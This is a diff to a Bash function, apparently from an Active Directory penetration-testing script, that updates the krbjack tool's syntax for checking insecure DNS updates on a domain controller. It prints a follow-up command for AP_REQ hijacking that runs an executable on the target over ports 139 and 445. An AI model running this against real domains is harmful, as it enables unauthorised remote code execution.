@@ -1473,10 +1473,10 @@ krbjack_attack () {
         echo -e "${RED}[-] Please verify the location of krbjack${NC}"
     else
         echo -e "${BLUE}[*] Checking for DNS unsecure updates using krbjack${NC}"
-        run_command "${krbjack} --check --dc-ip ${dc_ip} --domain ${domain} --target-name ${dc_NETBIOS}" 2>&1 | tee ${output_dir}/Kerberos/krbjack_output_${dc_domain}.txt
+        run_command "${krbjack} check --dc-ip ${dc_ip} --domain ${domain}" 2>&1 | tee ${output_dir}/Kerberos/krbjack_output_${dc_domain}.txt
         if [[ ! $(grep 'This domain IS NOT vulnerable' ${output_dir}/Kerberos/krbjack_output_${dc_domain}.txt 2>/dev/null) ]]; then
             echo -e "${GREEN}[+] DNS unsecure updates possible! Follow steps below to abuse the vuln and perform AP_REQ hijacking:${NC}"
-            echo -e "${krbjack} --dc-ip ${dc_ip} --domain ${domain} --target-name ${dc_NETBIOS} --ports 139,445 --executable <PATH_TO_EXECUTABLE_TO_RUN>"
+            echo -e "${krbjack} run --dc-ip ${dc_ip} --target-ip ${dc_ip} --domain ${domain} --target-name ${dc_NETBIOS} --ports 139,445 --executable <PATH_TO_EXECUTABLE_TO_RUN>"
         fi
     fi
     echo -e ""
